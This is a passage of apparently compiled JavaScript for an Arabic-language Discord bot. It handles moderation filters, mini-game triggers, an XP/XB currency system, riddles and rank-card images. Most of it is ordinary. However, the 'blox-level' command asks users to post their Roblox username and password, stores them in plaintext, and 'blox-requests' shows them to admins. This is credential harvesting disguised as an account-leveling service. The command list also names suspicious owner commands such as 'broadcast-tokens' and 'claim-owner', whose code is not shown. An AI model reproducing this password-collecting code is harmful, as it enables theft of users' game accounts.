          if (mentionedUser.id === message.author.id) {
            await message.delete().catch(() => {
            });
            const errorMsg = await message.channel.send(`\u274C **${message.author}\u060C \u0644\u0627 \u064A\u0645\u0643\u0646\u0643 \u062A\u0642\u064A\u064A\u0645 \u0646\u0641\u0633\u0643!**`);
            setTimeout(() => errorMsg.delete().catch(() => {
            }), 3e3);
            return;
          }
          await message.delete().catch(() => {
          });
          const prompt = await message.channel.send(`\u{1F4DD} **${message.author}\u060C \u0627\u0643\u062A\u0628 \u0631\u0623\u064A\u0643 \u0641\u064A \u0627\u0644\u0625\u062F\u0627\u0631\u064A ${mentionedUser}: (\u0623\u0648 \u0627\u0643\u062A\u0628 "\u0625\u0644\u063A\u0627\u0621")**`);
          evaluationStates.set(stateKey, {
            staffId: mentionedUser.id,
            step: "opinion",
            promptMsgId: prompt.id
          });
          setTimeout(() => {
            if (evaluationStates.has(stateKey)) {
              evaluationStates.delete(stateKey);
            }
          }, 12e4);
          return;
        }
      }
    }
    const badwords = db.prepare("SELECT word FROM badwords WHERE guildId = ?").all(guildId);
    if (badwords.length > 0 && !message.member?.permissions.has(PermissionFlagsBits.ManageMessages)) {
      const hasBadword = badwords.some((bw) => content.includes(bw.word.toLowerCase()));
      if (hasBadword) {
        await message.delete().catch(() => {
        });
        const warnMsg = await message.channel.send(`\u26A0\uFE0F ${message.author}, \u0627\u0644\u0643\u0644\u0645\u0627\u062A \u0627\u0644\u0628\u0630\u064A\u0626\u0629 \u063A\u064A\u0631 \u0645\u0633\u0645\u0648\u062D \u0628\u0647\u0627!`).catch(() => {
        });
        const protection2 = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guildId);
        if (protection2 && protection2.logChannel) {
          const logChannel = message.guild.channels.cache.get(protection2.logChannel);
          if (logChannel) {
            const logEmbed = new EmbedBuilder().setColor("#FF0000").setTitle("\u{1F6E1}\uFE0F Badword Detected").addFields(
              { name: "User", value: `${message.author.tag} (${message.author.id})`, inline: true },
              { name: "Channel", value: `<#${message.channel.id}>`, inline: true },
              { name: "Content", value: message.content.slice(0, 1024) }
            ).setTimestamp();
            logChannel.send({ embeds: [logEmbed] }).catch(() => {
            });
          }
        }
        if (warnMsg && "delete" in warnMsg) {
          setTimeout(() => warnMsg.delete().catch(() => {
          }), 5e3);
        }
        return;
      }
    }
    const protection = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guildId);
    if (protection) {
      if (protection.antiLink === 1) {
        const hasLink = /(https?:\/\/[^\s]+)/g.test(message.content);
        if (hasLink && !message.member?.permissions.has(PermissionFlagsBits.ManageMessages)) {
          await message.delete().catch(() => {
          });
          const warnMsg = await message.channel.send(`\u26A0\uFE0F ${message.author}, \u0627\u0644\u0631\u0648\u0627\u0628\u0637 \u063A\u064A\u0631 \u0645\u0633\u0645\u0648\u062D \u0628\u0647\u0627 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631!`).catch(() => {
          });
          if (protection.logChannel) {
            const logChannel = message.guild.channels.cache.get(protection.logChannel);
            if (logChannel) {
              const logEmbed = new EmbedBuilder().setColor("#FF0000").setTitle("\u{1F6E1}\uFE0F Anti-Link Triggered").addFields(
                { name: "User", value: `${message.author.tag} (${message.author.id})`, inline: true },
                { name: "Channel", value: `<#${message.channel.id}>`, inline: true },
                { name: "Content", value: message.content.slice(0, 1024) }
              ).setTimestamp();
              logChannel.send({ embeds: [logEmbed] }).catch(() => {
              });
            }
          }
          if (warnMsg && "delete" in warnMsg) {
            setTimeout(() => warnMsg.delete().catch(() => {
            }), 5e3);
          }
          return;
        }
      }
      if (protection.antiSpam === 1 && !message.member?.permissions.has(PermissionFlagsBits.ManageMessages)) {
        const key = `${message.author.id}-${guildId}`;
        const now = Date.now();
        const userData = spamMap.get(key) || { count: 0, lastMessage: 0 };
        if (now - userData.lastMessage < 2e3) {
          userData.count++;
        } else {
          userData.count = 1;
        }
        userData.lastMessage = now;
        spamMap.set(key, userData);
        if (userData.count > 5) {
          await message.delete().catch(() => {
          });
          const warnMsg = await message.channel.send(`\u26A0\uFE0F ${message.author}, \u062A\u0648\u0642\u0641 \u0639\u0646 \u0627\u0644\u0633\u0628\u0627\u0645!`).catch(() => {
          });
          if (protection.logChannel) {
            const logChannel = message.guild.channels.cache.get(protection.logChannel);
            if (logChannel) {
              const logEmbed = new EmbedBuilder().setColor("#FF0000").setTitle("\u{1F6E1}\uFE0F Anti-Spam Triggered").addFields(
                { name: "User", value: `${message.author.tag} (${message.author.id})`, inline: true },
                { name: "Channel", value: `<#${message.channel.id}>`, inline: true }
              ).setTimestamp();
              logChannel.send({ embeds: [logEmbed] }).catch(() => {
              });
            }
          }
          if (warnMsg && "delete" in warnMsg) {
            setTimeout(() => warnMsg.delete().catch(() => {
            }), 5e3);
          }
          return;
        }
      }
    }
    const prefixSetting = db.prepare("SELECT value FROM settings WHERE key = ?").get(`prefix_${guildId}`);
    const currentPrefix = prefixSetting ? prefixSetting.value : PREFIX;
    const lowerContent = message.content.toLowerCase();
    const lowerPrefix = currentPrefix.toLowerCase();
    const userId = message.author.id;
    const gameTriggers = {
      "roulette": "roulette",
      "\u0631\u0648\u0644\u064A\u062A": "roulette",
      "replica": "replica",
      "\u0631\u064A\u0628\u064A\u0643\u0627": "replica",
      "trivia": "trivia",
      "\u0641\u0639\u0627\u0644\u064A\u0627\u062A": "trivia",
      "\u0633\u0624\u0627\u0644": "trivia",
      "hangman": "hangman",
      "\u0645\u0634\u0646\u0642\u0629": "hangman",
      "fastclick": "fastclick",
      "\u0623\u0633\u0631\u0639": "fastclick",
      "\u0636\u063A\u0637\u0629": "fastclick",
      "snake": "snake",
      "\u062B\u0639\u0628\u0627\u0646": "snake",
      "mafia": "mafia",
      "\u0645\u0627\u0641\u064A\u0627": "mafia",
      "rps": "rps",
      "\u062D\u062C\u0631 \u0648\u0631\u0642\u0629 \u0645\u0642\u0635": "rps",
      "coinflip": "coinflip",
      "\u0639\u0645\u0644\u0629": "coinflip",
      "guess": "guess",
      "\u062A\u062E\u0645\u064A\u0646": "guess"
    };
    const triggeredGame = gameTriggers[lowerContent] || (lowerContent.startsWith(lowerPrefix) ? gameTriggers[lowerContent.slice(lowerPrefix.length).trim()] : null);
    if (triggeredGame) {
      const mockInteraction = {
        commandName: triggeredGame,
        user: message.author,
        member: message.member,
        guild: message.guild,
        guildId: message.guildId,
        channel: message.channel,
        channelId: message.channelId,
        options: {
          getString: (name) => null,
          getInteger: (name) => null,
          getUser: (name) => null,
          getRole: (name) => null,
          getChannel: (name) => null
        },
        reply: async (options) => {
          if (typeof options === "string") return message.reply(options);
          return message.reply(options);
        },
        editReply: async (options) => {
          return message.channel.send(options);
        },
        deferReply: async () => {
          return message.channel.sendTyping();
        },
        followUp: async (options) => {
          return message.channel.send(options);
        },
        isCommand: () => true,
        isButton: () => false,
        isStringSelectMenu: () => false,
        isModalSubmit: () => false,
        fetchReply: async () => {
          return message;
        }
      };
      if (triggeredGame === "roulette") {
        handleRouletteCommand(mockInteraction);
      } else if (triggeredGame === "snake") {
        handleSnakeCommand(mockInteraction);
      } else if (triggeredGame === "replica") {
        handleReplicaCommand(mockInteraction);
      }
    }
    if (!lowerContent.startsWith(lowerPrefix)) {
      let xpToAdd = Math.floor(Math.random() * 10) + 5;
      let multiplier = 1;
      if (BONUS_CHANNELS.includes(message.channel.id)) {
        multiplier *= 2;
      }
      const currentHour = (/* @__PURE__ */ new Date()).getHours();
      if (currentHour >= HAPPY_HOUR_START && currentHour < HAPPY_HOUR_END) {
        multiplier *= 2;
      }
      xpToAdd *= multiplier;
      await addXP(userId, guildId, xpToAdd, message.guild, message.author, message.member, message.channel);
      return;
    }
    const args = message.content.slice(lowerPrefix.length).trim().split(/ +/);
    const firstWord = args.shift()?.toLowerCase();
    if (firstWord) {
      const alias = db.prepare("SELECT originalCommand FROM aliases WHERE guildId = ? AND aliasName = ?").get(guildId, firstWord);
      const commandName = alias ? alias.originalCommand : firstWord;
      if (!message.member?.permissions.has(PermissionFlagsBits.Administrator) && !isCommandAllowed(guildId, commandName, message.channelId)) {
        return;
      }
      const supportedCommands = [
        "rank",
        "top",
        "bonus",
        "id",
        "rewards",
        "unban",
        "resetserver",
        "reset-server",
        "ping",
        "nick",
        "clear",
        "setup-ticket",
        "setxp",
        "set-reward",
        "set-prefix",
        "set-level",
        "disable",
        "toggle",
        "set-alias",
        "remove-alias",
        "set-avatar",
        "promote-owner",
        "accept",
        "tickets-by-category",
        "transfer",
        "setup-verify",
        "broadcast",
        "broadcast-here",
        "broadcast-tokens",
        "guilds",
        "get-invite",
        "claim-owner",
        "force-accept",
        "join-server",
        "rps",
        "coinflip",
        "guess",
        "mafia",
        "trivia",
        "hangman",
        "fastclick",
        "snake",
        "copy-server",
        "botinfo",
        "add-role",
        "remove-role",
        "list-roles",
        "p",
        "c",
        "xbp",
        "xbc",
        "add-xb",
        "inadd-xb",
        "reset-xb",
        "u",
        "y",
        "ai",
        "ai-challenge",
        "s",
        "blox-level",
        "blox-requests"
      ];
      if (supportedCommands.includes(commandName)) {
        if (commandName === "s") {
          const topXB = db.prepare("SELECT userId, xb FROM leveling WHERE guildId = ? AND xb > 0 ORDER BY xb DESC LIMIT 10").all(guildId);
          if (topXB.length === 0) {
            return message.reply("\u274C \u0644\u0627 \u064A\u0648\u062C\u062F \u0628\u064A\u0627\u0646\u0627\u062A XB \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0639\u062F.");
          }
          const embed = new EmbedBuilder().setTitle("\u{1F3C6} \u0642\u0627\u0626\u0645\u0629 \u0645\u062A\u0635\u062F\u0631\u064A \u0627\u0644\u0640 XB").setColor(16766720).setTimestamp().setFooter({ text: `\u0637\u0644\u0628 \u0628\u0648\u0627\u0633\u0637\u0629 ${message.author.tag}`, iconURL: message.author.displayAvatarURL() });
          let description = "";
          for (let i = 0; i < topXB.length; i++) {
            const user = await client.users.fetch(topXB[i].userId).catch(() => null);
            const username = user ? user.tag : "\u0645\u0633\u062A\u062E\u062F\u0645 \u063A\u064A\u0631 \u0645\u0639\u0631\u0648\u0641";
            const medal = i === 0 ? "\u{1F947}" : i === 1 ? "\u{1F948}" : i === 2 ? "\u{1F949}" : `${i + 1}.`;
            description += `${medal} **${username}** - \`${topXB[i].xb}\` XB
`;
          }
          embed.setDescription(description || "\u0644\u0627 \u064A\u0648\u062C\u062F \u0645\u062A\u0635\u062F\u0631\u064A\u0646 \u062D\u0627\u0644\u064A\u0627\u064B.");
          return message.reply({ embeds: [embed] });
        }
        if (commandName === "blox-level") {
          const username = args[0];
          const password = args[1];
          if (!username || !password) return message.reply(`\u274C \u0627\u0644\u0627\u0633\u062A\u062E\u062F\u0627\u0645 \u0627\u0644\u0635\u062D\u064A\u062D: \`${currentPrefix}blox-level <username> <password>\``);
          try {
            db.prepare("INSERT INTO blox_fruits_requests (userId, guildId, robloxUsername, robloxPassword, status) VALUES (?, ?, ?, ?, ?)").run(message.author.id, guildId, username, password, "pending");
            return message.reply("\u2705 \u062A\u0645 \u0627\u0633\u062A\u0644\u0627\u0645 \u0637\u0644\u0628 \u062A\u0644\u0641\u064A\u0644 \u062D\u0633\u0627\u0628\u0643 \u0628\u0646\u062C\u0627\u062D! \u0633\u064A\u062A\u0645 \u0645\u0631\u0627\u062C\u0639\u062A\u0647 \u0648\u0627\u0644\u0628\u062F\u0621 \u0641\u064A\u0647 \u0642\u0631\u064A\u0628\u0627\u064B.");
          } catch (err) {
            console.error("Error saving blox-level request:", err);
            return message.reply("\u274C \u062D\u062F\u062B \u062E\u0637\u0623 \u0623\u062B\u0646\u0627\u0621 \u062D\u0641\u0638 \u0637\u0644\u0628\u0643.");
          }
        }
        if (commandName === "blox-requests") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
          const requests = db.prepare("SELECT * FROM blox_fruits_requests WHERE status = 'pending' LIMIT 10").all();
          if (requests.length === 0) return message.reply("\u274C \u0644\u0627 \u062A\u0648\u062C\u062F \u0637\u0644\u0628\u0627\u062A \u0645\u0639\u0644\u0642\u0629.");
          const embed = new EmbedBuilder().setTitle("\u{1F4CB} \u0637\u0644\u0628\u0627\u062A \u062A\u0644\u0641\u064A\u0644 \u0628\u0644\u0648\u0643\u0633 \u0641\u0631\u0648\u062A").setColor(5793266);
          let desc = "";
          requests.forEach((req) => {
            desc += `**ID:** \`${req.id}\` | <@${req.userId}>
**User:** \`${req.robloxUsername}\` | **Pass:** \`${req.robloxPassword}\`

`;
          });
          embed.setDescription(desc);
          return message.reply({ embeds: [embed] });
        }
        if (commandName === "ai-challenge") {
          const riddles = [
            { riddle: "\u0634\u064A\u0621 \u0644\u0647 \u0623\u0633\u0646\u0627\u0646 \u0648\u0644\u0627 \u064A\u0639\u0636\u060C \u0645\u0627 \u0647\u0648\u061F", answer: "\u0627\u0644\u0645\u0634\u0637" },
            { riddle: "\u0634\u064A\u0621 \u064A\u0643\u062A\u0628 \u0648\u0644\u0627 \u064A\u0642\u0631\u0623\u060C \u0645\u0627 \u0647\u0648\u061F", answer: "\u0627\u0644\u0642\u0644\u0645" },
            { riddle: "\u0634\u064A\u0621 \u0643\u0644\u0645\u0627 \u0632\u0627\u062F \u0646\u0642\u0635\u060C \u0645\u0627 \u0647\u0648\u061F", answer: "\u0627\u0644\u0639\u0645\u0631" },
            { riddle: "\u0634\u064A\u0621 \u0644\u0647 \u0623\u0631\u062C\u0644 \u0648\u0644\u0643\u0646\u0647 \u0644\u0627 \u064A\u0645\u0634\u064A\u060C \u0645\u0627 \u0647\u0648\u061F", answer: "\u0627\u0644\u0643\u0631\u0633\u064A" },
            { riddle: "\u0634\u064A\u0621 \u064A\u0642\u0631\u0635\u0643 \u0648\u0644\u0627 \u062A\u0631\u0627\u0647\u060C \u0645\u0627 \u0647\u0648\u061F", answer: "\u0627\u0644\u062C\u0648\u0639" },
            { riddle: "\u0634\u064A\u0621 \u064A\u062E\u062A\u0631\u0642 \u0627\u0644\u0632\u062C\u0627\u062C \u0648\u0644\u0627 \u064A\u0643\u0633\u0631\u0647\u060C \u0645\u0627 \u0647\u0648\u061F", answer: "\u0627\u0644\u0636\u0648\u0621" },
            { riddle: "\u0634\u064A\u0621 \u0644\u0647 \u0639\u064A\u0646 \u0648\u0627\u062D\u062F\u0629 \u0648\u0644\u0643\u0646\u0647 \u0644\u0627 \u064A\u0631\u0649\u060C \u0645\u0627 \u0647\u0648\u061F", answer: "\u0627\u0644\u0625\u0628\u0631\u0629" },
            { riddle: "\u0634\u064A\u0621 \u0625\u0630\u0627 \u063A\u0644\u064A\u062A\u0647 \u062C\u0645\u062F\u060C \u0645\u0627 \u0647\u0648\u061F", answer: "\u0627\u0644\u0628\u064A\u0636" },
            { riddle: "\u0634\u064A\u0621 \u0644\u0647 \u062C\u0644\u062F \u0648\u0644\u064A\u0633 \u062D\u064A\u0648\u0627\u0646\u0627\u064B\u060C \u0648\u0644\u0647 \u0648\u0631\u0642 \u0648\u0644\u064A\u0633 \u0634\u062C\u0631\u0627\u064B\u060C \u0645\u0627 \u0647\u0648\u061F", answer: "\u0627\u0644\u0643\u062A\u0627\u0628" },
            { riddle: "\u0634\u064A\u0621 \u064A\u0645\u0634\u064A \u0628\u0644\u0627 \u0623\u0631\u062C\u0644 \u0648\u064A\u0628\u0643\u064A \u0628\u0644\u0627 \u0639\u064A\u0648\u0646\u060C \u0645\u0627 \u0647\u0648\u061F", answer: "\u0627\u0644\u0633\u062D\u0627\u0628" }
          ];
          const data = riddles[Math.floor(Math.random() * riddles.length)];
          const embed = new EmbedBuilder().setTitle("\u{1F9E0} \u062A\u062D\u062F\u064A \u0627\u0644\u0630\u0643\u0627\u0621 \u0627\u0644\u0627\u0635\u0637\u0646\u0627\u0639\u064A (\u0644\u063A\u0632)").setDescription(`**\u0627\u0644\u0644\u063A\u0632:**
${data.riddle}`).setColor(16753920).setFooter({ text: "\u0644\u062F\u064A\u0643 30 \u062B\u0627\u0646\u064A\u0629 \u0644\u0644\u062D\u0644!" }).setTimestamp();
          await message.reply({ embeds: [embed] });
          const filter = (m) => m.content.toLowerCase().trim() === data.answer.toLowerCase().trim();
          const collector = message.channel.createMessageCollector({ filter, time: 3e4, max: 1 });
          collector.on("collect", async (m) => {
            const xbReward = 35;
            await awardXB(guildId, m.author.id, xbReward, "Riddle win");
            const winEmbed = new EmbedBuilder().setTitle("\u{1F389} \u0639\u0628\u0642\u0631\u064A!").setDescription(`\u0645\u0628\u0631\u0648\u0643 \u064A\u0627 ${m.author}! \u0627\u0644\u0625\u062C\u0627\u0628\u0629 \u0627\u0644\u0635\u062D\u064A\u062D\u0629 \u0647\u064A: **${data.answer}**

\u{1F4B0} \u0644\u0642\u062F \u062D\u0635\u0644\u062A \u0639\u0644\u0649 **${xbReward}** XB!`).setColor(65280).setTimestamp();
            message.channel.send({ embeds: [winEmbed] });
          });
          collector.on("end", (collected) => {
            if (collected.size === 0) {
              const loseEmbed = new EmbedBuilder().setTitle("\u{1F614} \u062D\u0638\u0627\u064B \u0623\u0648\u0641\u0631!").setDescription(`\u0627\u0646\u062A\u0647\u0649 \u0627\u0644\u0648\u0642\u062A! \u0627\u0644\u0625\u062C\u0627\u0628\u0629 \u0643\u0627\u0646\u062A: **${data.answer}**`).setColor(16711680).setTimestamp();
              message.channel.send({ embeds: [loseEmbed] });
            }
          });
          return;
        } else if (commandName === "ai") {
          const prompt = args.join(" ");
          if (!prompt) return message.reply("\u274C \u064A\u0631\u062C\u0649 \u0643\u062A\u0627\u0628\u0629 \u0633\u0624\u0627\u0644 \u0644\u0644\u0630\u0643\u0627\u0621 \u0627\u0644\u0627\u0635\u0637\u0646\u0627\u0639\u064A.");
          await handleAIResponse(message, prompt);
          return;
        }
        if (commandName === "u") {
          const targetUser = message.mentions.users.first() || message.author;
          const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId);
          const xp = userRow?.xp || 0;
          const level = userRow?.level || 0;
          const leaderboard = db.prepare("SELECT userId FROM leveling WHERE guildId = ? ORDER BY level DESC, xp DESC").all(guildId);
          const rank = leaderboard.findIndex((u) => u.userId === targetUser.id) + 1;
          const embed = new EmbedBuilder().setTitle(`\u{1F4CA} \u0646\u0634\u0627\u0637 ${targetUser.username}`).setThumbnail(targetUser.displayAvatarURL()).addFields(
            { name: "\u0627\u0644\u0645\u0633\u062A\u0648\u0649", value: level.toString(), inline: true },
            { name: "\u0627\u0644\u062E\u0628\u0631\u0629 (XP)", value: xp.toString(), inline: true },
            { name: "\u0627\u0644\u062A\u0631\u062A\u064A\u0628", value: `#${rank}`, inline: true }
          ).setColor(44678);
          return message.reply({ embeds: [embed] });
        }
        if (commandName === "y") {
          const targetUser = message.mentions.users.first() || message.author;
          const targetMember = await message.guild.members.fetch(targetUser.id).catch(() => null);
          if (!targetMember) return message.reply("\u274C \u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645 \u063A\u064A\u0631 \u0645\u0648\u062C\u0648\u062F.");
          const joinedAt = targetMember.joinedAt;
          const embed = new EmbedBuilder().setTitle(`\u{1F4C5} \u062A\u0627\u0631\u064A\u062E \u0627\u0644\u0627\u0646\u0636\u0645\u0627\u0645`).setDescription(`${targetUser} \u0627\u0646\u0636\u0645 \u0625\u0644\u0649 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0641\u064A:
**${joinedAt?.toLocaleDateString("ar-EG", { weekday: "long", year: "numeric", month: "long", day: "numeric" })}**`).setColor(5793266);
          return message.reply({ embeds: [embed] });
        }
        if (commandName === "id") {
          const targetUser = message.mentions.users.first() || message.author;
          const targetMember = await message.guild.members.fetch(targetUser.id).catch(() => null);
          if (!targetMember) {
            return message.reply("\u274C \u0647\u0630\u0627 \u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645 \u063A\u064A\u0631 \u0645\u0648\u062C\u0648\u062F \u0641\u064A \u0627\u0644\u0633\u064A\u0631\u0641\u0631.");
          }
          const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId);
          const level = userRow?.level || 0;
          const xb = userRow?.xb || 0;
          const xp = userRow?.xp || 0;
          const nextLevelXp = (level + 1) * 300;
          const leaderboard = db.prepare("SELECT userId FROM leveling WHERE guildId = ? ORDER BY level DESC, xp DESC").all(guildId);
          const rank = leaderboard.findIndex((u) => u.userId === targetUser.id) + 1;
          const width = 800;
          const height = 300;
          const canvas = createCanvas(width, height);
          const ctx = canvas.getContext("2d");
          const encoder = new GIFEncoder(width, height);
          encoder.start();
          encoder.setRepeat(-1);
          encoder.setDelay(500);
          encoder.setQuality(10);
          const avatarURL = targetUser.displayAvatarURL({ extension: "png", size: 256 });
          const avatar = await loadImage(avatarURL);
          const targetProgress = Math.min(xp / nextLevelXp, 1);
          ctx.clearRect(0, 0, width, height);
          const bgGradient = ctx.createLinearGradient(0, 0, width, height);
          bgGradient.addColorStop(0, "#1a1a2e");
          bgGradient.addColorStop(1, "#16213e");
          ctx.fillStyle = bgGradient;
          ctx.fillRect(0, 0, width, height);
          ctx.save();
          ctx.globalAlpha = 0.1;
          ctx.fillStyle = "#5865f2";
          ctx.beginPath();
          ctx.arc(width, 0, 200, 0, Math.PI * 2);
          ctx.fill();
          ctx.beginPath();
          ctx.arc(0, height, 150, 0, Math.PI * 2);
          ctx.fill();
          ctx.restore();
          ctx.save();
          ctx.fillStyle = "rgba(255, 255, 255, 0.05)";
          ctx.beginPath();
          ctx.roundRect(30, 30, width - 60, height - 60, 25);
          ctx.fill();
          ctx.strokeStyle = "rgba(255, 255, 255, 0.1)";
          ctx.lineWidth = 1;
          ctx.stroke();
          ctx.restore();
          ctx.save();
          ctx.shadowBlur = 20;
          ctx.shadowColor = "#5865f2";
          ctx.beginPath();
          ctx.arc(130, 150, 80, 0, Math.PI * 2);
          ctx.fillStyle = "#5865f2";
          ctx.globalAlpha = 0.2;
          ctx.fill();
          ctx.restore();
          ctx.save();
          ctx.beginPath();
          ctx.arc(130, 150, 75, 0, Math.PI * 2, true);
          ctx.clip();
          ctx.drawImage(avatar, 55, 75, 150, 150);
          ctx.restore();
          ctx.save();
          ctx.strokeStyle = "#5865f2";
          ctx.lineWidth = 4;
          ctx.beginPath();
          ctx.arc(130, 150, 77, 0, Math.PI * 2);
          ctx.stroke();
          ctx.restore();
          ctx.fillStyle = "#ffffff";
          ctx.font = "bold 36px Arial";
          ctx.fillText(targetUser.username, 240, 90);
          ctx.font = "24px Arial";
          ctx.fillStyle = "rgba(255, 255, 255, 0.7)";
          ctx.fillText(`Rank: #${rank}`, 240, 130);
          ctx.fillStyle = "rgba(255, 255, 255, 0.5)";
          ctx.font = "18px Arial";
          ctx.fillText(`Level ${level}`, 240, 185);
          ctx.fillText(`${xp} / ${nextLevelXp} XP`, width - 180, 185);
          ctx.fillStyle = "rgba(255, 255, 255, 0.1)";
          ctx.beginPath();
          ctx.roundRect(240, 200, 500, 20, 10);
          ctx.fill();
          const barGradient = ctx.createLinearGradient(240, 0, 740, 0);
          barGradient.addColorStop(0, "#5865f2");
          barGradient.addColorStop(1, "#858df3");
          ctx.fillStyle = barGradient;
          ctx.beginPath();
          ctx.roundRect(240, 200, 500 * targetProgress, 20, 10);
          ctx.fill();
          ctx.shadowBlur = 10;
          ctx.shadowColor = "#5865f2";
          ctx.fillStyle = "#ffffff";
          ctx.beginPath();
          ctx.arc(240 + 500 * targetProgress, 210, 8, 0, Math.PI * 2);
          ctx.fill();
          ctx.shadowBlur = 0;
          encoder.addFrame(ctx);
          encoder.finish();
          const buffer = encoder.out.getData();
          const attachment = new AttachmentBuilder(buffer, { name: "id.gif" });
          return message.reply({ files: [attachment] });
        }
        if (commandName === "p" || commandName === "xbp") {
          const targetUser = message.mentions.users.first() || message.author;
          const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId);
          const level = userRow?.level || 0;
          const xb = userRow?.xb || 0;
          const xp = userRow?.xp || 0;
          const nextLevelXp = (level + 1) * 300;
          try {
            const buffer = await generateProfileImage(targetUser, level, xb, xp, nextLevelXp);
            const attachment = new AttachmentBuilder(buffer, { name: "profile.gif" });
            return message.reply({ files: [attachment] });
          } catch (err) {
            console.error("Profile image generation failed:", err);
            return message.reply("\u274C \u0641\u0634\u0644 \u0641\u064A \u0625\u0646\u0634\u0627\u0621 \u0635\u0648\u0631\u0629 \u0627\u0644\u0628\u0631\u0648\u0641\u0627\u064A\u0644.");
          }
        }
        if (commandName === "c" || commandName === "xbc") {
          const targetUser = message.mentions.users.first();
          const amount = parseInt(args[1]);
          if (!targetUser && args.length === 0) {
            const userRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(message.author.id, guildId);
            const balance = userRow?.xb || 0;
            return message.reply(`\u{1F4B0} \u0631\u0635\u064A\u062F\u0643 \u0627\u0644\u062D\u0627\u0644\u064A \u0647\u0648: **${balance}** XB`);
          }
          if (targetUser && (isNaN(amount) || args.length === 1)) {
            const userRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId);
            const balance = userRow?.xb || 0;
            return message.reply(`\u{1F4B0} \u0631\u0635\u064A\u062F **${targetUser.username}** \u0647\u0648: **${balance}** XB`);
          }
          if (targetUser && !isNaN(amount) && amount > 0) {
            if (targetUser.id === message.author.id) return message.reply("\u274C \u0644\u0627 \u064A\u0645\u0643\u0646\u0643 \u062A\u062D\u0648\u064A\u0644 \u0627\u0644\u0639\u0645\u0644\u0627\u062A \u0644\u0646\u0641\u0633\u0643.");
            const senderRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(message.author.id, guildId);
            const senderBalance = senderRow?.xb || 0;
            if (senderBalance < amount) {
              return message.reply(`\u274C \u0631\u0635\u064A\u062F\u0643 \u063A\u064A\u0631 \u0643\u0627\u0641\u064D. \u0631\u0635\u064A\u062F\u0643 \u0627\u0644\u062D\u0627\u0644\u064A \u0647\u0648 **${senderBalance}** XB.`);
            }
            db.prepare("UPDATE leveling SET xb = xb - ? WHERE userId = ? AND guildId = ?").run(amount, message.author.id, guildId);
            await awardXB(guildId, targetUser.id, amount, `Transfer from ${message.author.username}`);
            return message.reply(`\u2705 \u062A\u0645 \u062A\u062D\u0648\u064A\u0644 **${amount}** XB \u0628\u0646\u062C\u0627\u062D \u0625\u0644\u0649 ${targetUser}.`);
          }
          return message.reply(`\u274C \u0627\u0644\u0627\u0633\u062A\u062E\u062F\u0627\u0645 \u0627\u0644\u0635\u062D\u064A\u062D:
- \`${currentPrefix}c\` \u0644\u0631\u0624\u064A\u0629 \u0631\u0635\u064A\u062F\u0643
- \`${currentPrefix}c @user\` \u0644\u0631\u0624\u064A\u0629 \u0631\u0635\u064A\u062F \u0639\u0636\u0648
- \`${currentPrefix}c @user <\u0627\u0644\u0645\u0628\u0644\u063A>\` \u0644\u062A\u062D\u0648\u064A\u0644 \u0639\u0645\u0644\u0627\u062A`);
        }
        if (commandName === "add-xb") {
          if (!AUTHORIZED_CURRENCY_IDS.includes(message.author.id)) return;
          const targetUser = message.mentions.users.first();
          const amount = parseInt(args[1]);
          if (!targetUser || isNaN(amount)) return message.reply(`Usage: ${currentPrefix}add-xb @user <amount>`);
          await awardXB(guildId, targetUser.id, amount, "Admin add");
          return message.reply(`\u2705 \u062A\u0645 \u0625\u0636\u0627\u0641\u0629 **${amount}** XB \u0625\u0644\u0649 \u0631\u0635\u064A\u062F ${targetUser}.`);
        }
        if (commandName === "inadd-xb") {
          if (!AUTHORIZED_CURRENCY_IDS.includes(message.author.id)) return;
          const targetUser = message.mentions.users.first();
          const amount = parseInt(args[1]);
          if (!targetUser || isNaN(amount)) return message.reply(`Usage: ${currentPrefix}inadd-xb @user <amount>`);
          await deductXB(guildId, targetUser.id, amount, "Admin remove");
          return message.reply(`\u2705 \u062A\u0645 \u0633\u062D\u0628 **${amount}** XB \u0645\u0646 \u0631\u0635\u064A\u062F ${targetUser}.`);
        }
        if (commandName === "reset-xb") {
          if (!AUTHORIZED_CURRENCY_IDS.includes(message.author.id)) return;
          const targetUser = message.mentions.users.first();
          const resetAll = args[0] === "all" || args[0] === "\u0627\u0644\u0643\u0644";
          if (resetAll) {
            const allUsers = db.prepare("SELECT userId, xb FROM leveling WHERE guildId = ?").all(guildId);
            for (const u of allUsers) {
              await deductXB(guildId, u.userId, u.xb, "Admin reset all");
            }
            return message.reply("\u2705 \u062A\u0645 \u062A\u0635\u0641\u064A\u0631 \u0631\u0635\u064A\u062F XB \u0644\u062C\u0645\u064A\u0639 \u0627\u0644\u0623\u0639\u0636\u0627\u0621 \u0641\u064A \u0627\u0644\u0633\u064A\u0631\u0641\u0631.");
          } else if (targetUser) {
            const targetRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId);
            const currentBalance = targetRow?.xb || 0;
            await deductXB(guildId, targetUser.id, currentBalance, "Admin reset");
            return message.reply(`\u2705 \u062A\u0645 \u062A\u0635\u0641\u064A\u0631 \u0631\u0635\u064A\u062F XB \u0644\u0644\u0639\u0636\u0648 ${targetUser}.`);
          } else {
            return message.reply(`Usage: ${currentPrefix}reset-xb @user OR ${currentPrefix}reset-xb all`);
          }
        }
        if (commandName === "ping") {
          return message.reply(`Pong! Latency is ${client.ws.ping}ms.`);
        }
        if (commandName === "rank") {
          const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(userId, guildId);
          if (!userRow) return message.reply("You don't have a rank yet. Start chatting!");
          const dynamicRewards = db.prepare("SELECT level, roleId FROM rewards WHERE guildId = ?").all(guildId);
